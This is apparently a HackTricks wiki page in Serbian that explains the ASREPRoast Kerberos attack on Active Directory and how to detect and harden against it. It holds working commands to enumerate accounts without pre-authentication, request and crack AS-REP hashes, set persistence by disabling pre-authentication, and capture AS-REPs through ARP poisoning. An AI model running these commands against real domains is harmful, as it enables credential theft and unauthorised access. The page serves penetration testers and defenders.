# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast je bezbednosni napad koji iskorišćava korisnike kojima nedostaje atribut **Kerberos pre-authentication required**. Ova ranjivost u suštini omogućava napadačima da od kontrolera domena (DC) zatraže autentifikaciju za korisnika bez potrebe za njegovom lozinkom. DC zatim odgovara porukom šifrovanom ključem izvedenim iz korisnikove lozinke, koju napadači mogu pokušati da razbiju offline kako bi otkrili korisnikovu lozinku.

Glavni uslovi za ovaj napad su:

- **Nedostatak Kerberos pre-authentication**: Ova bezbednosna funkcija ne sme biti omogućena za ciljne korisnike.
- **Veza sa kontrolerom domena (DC)**: Napadačima je potreban pristup DC-u kako bi slali zahteve i primali šifrovane poruke.
- **Opcioni nalog na domenu**: Nalog na domenu omogućava napadačima da efikasnije identifikuju ranjive korisnike pomoću LDAP upita. Bez takvog naloga, napadači moraju da pogađaju korisnička imena.

#### Enumerisanje ranjivih korisnika (potrebni su akreditivi za domen)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Zahtevanje AS_REP poruke

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus podrazumevano zahteva **RC4**, zato se u događaju ID **4768** obično prikazuje **preauth type 0** i **ticket encryption type 0x17**. Ako dodate **`/aes`** (ili je RC4 onemogućen za cilj), očekujte **AES etypes** umesto toga.<sup>[[2]](#references)</sup>

#### Brze jednolinijske komande (Linux)

- Prvo nabrojte potencijalne ciljeve (npr. iz procurelih build putanja) pomoću Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast-ujte celu listu korisničkih imena bez validnih creds pomoću NetExec-a: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Ako imate creds, prepustite NetExec-u da upita LDAP i zatraži sve naloge koji mogu da se roast-uju: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Ako izlaz počinje sa **`$krb5asrep$23$`**, razbijte ga pomoću Hashcat-a **`-m 18200`**. Ako počinje sa **`$krb5asrep$17$`** ili **`$krb5asrep$18$`**, radije koristite John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Razbijanje

Nemojte pretpostavljati da je svaki AS-REP roast RC4. Moderni alati mogu da vrate **RC4** (`$krb5asrep$23$`) ili **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), u zavisnosti od zatraženog/usaglašenog enctypa. **`hashcat -m 18200`** služi za **etype 23**, dok John direktno obrađuje `krb5asrep` za **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistence

Nametni da **preauth** nije obavezan za korisnika za kog imaš dozvole **GenericAll** (ili dozvole za upisivanje svojstava):

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Detekcija i ojačavanje

Uspešan **AS-REP zahtev bez preautentifikacije** generiše događaj **4768** na DC-u sa vrednostima `Status=0x0` i `PreAuthType=0`; to beleži zahtev, ali ne dokazuje da je neko razbio odgovor ili kompromitovao nalog. Nemojte zahtevati RC4 u detekciji: `TicketEncryptionType=0x17` je koristan signal slabe enkripcije, ali napadač može da zatraži AES (vrednosti u dnevniku događaja `0x11`/`0x12`). Na Windows Server 2016 i novijim verzijama sa kumulativnim ažuriranjem od 14. januara 2025. (ili novijim), verzija 2 događaja 4768 prikazuje i `ClientAdvertizedEncryptionTypes`, podržane etype-ove naloga/DC-a i dostupne ključeve.<sup>[[5]](#references)</sup>

Praktična pretraga označava klijenta koji oglašava samo RC4, dok nalog ima AES ključeve, a zatim povezuje nalete zahteva sa jedne izvorne IP adrese za više korisnika bez preautentifikacije. Postavite osnovnu liniju za legitimne izuzetke umesto da generišete upozorenje za svaki događaj `PreAuthType=0`.

Za pripisivanje normalizujte polje `IpAddress` (koje može sadržati IPv4 adresu mapiranu kao `::ffff:`) i uporedite vremenski prozor sa događajima 4769 za servisne karte ili 5140 za pristup deljenim resursima. Ti događaji mogu da navedu naloge aktivne sa iste adrese, ali za AS-REP zahtev bez preautentifikacije nije potreban autentifikovani nalog. Deljeni hostovi, NAT, proksiji i više sesija znače da poklapanje IP adrese **ne** identifikuje osobu ili nalog koji je poslao AS-REQ. Tretirajte povezane naloge kao tragove za istragu i potvrdite ih dokazima sa krajnje tačke ili mreže.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

Trajno rešenje je da uklonite opciju **Do not require Kerberos preauthentication** za svakog korisnika kome ona nije striktno potrebna i promenite izložene lozinke naloga. Ako izuzetak ne može da se ukloni, koristite dugu, nasumično generisanu lozinku i dodelite minimalne privilegije. Onemogućavanje RC4 povećava cenu razbijanja lozinke, ali ne uklanja podložnost roastovanju jer se AES AS-REP odgovori i dalje mogu razbijati offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast bez akreditiva

Napadač na putanji može da uhvati AS-REP koji se vraća tokom uobičajene, preautentifikovane AS razmene i da formatira njegov šifrovani deo za offline razbijanje lozinke. Za razliku od klasičnog ASREPRoasting-a, za ovo nije potreban `DONT_REQ_PREAUTH`; međutim, tako se dobijaju samo nalozi čija je Kerberos razmena zaista presretnuta. **ASRepCatcher** podrazumevano zauzima poziciju pomoću jednosmernog ARP poisoning-a ili može da preuzima saobraćaj iz druge MitM tehnike pomoću opcije `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Ako želite srodnu tehniku bez akreditiva koja vraća **service ticket** umesto **TGT**-a od principal-a bez preautentifikacije, pogledajte [Kerberoast](kerberoast.md).

U režimu `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) prosleđuje presretnute AS-REQ zahteve i nameće **RC4** kada ga obe strane i dalje dozvoljavaju. `listen` ne menja pakete i zato hvata enctype koji su klijent i DC dogovorili. Kad god je moguće, ograničite poisoning pomoću `-t`/`-tf` umesto da utičete na celu podmrežu.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Događaj 4768: Zatražena je Kerberos autentifikaciona karta](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Bezbednosni događaj 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Bezbednosni događaj 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
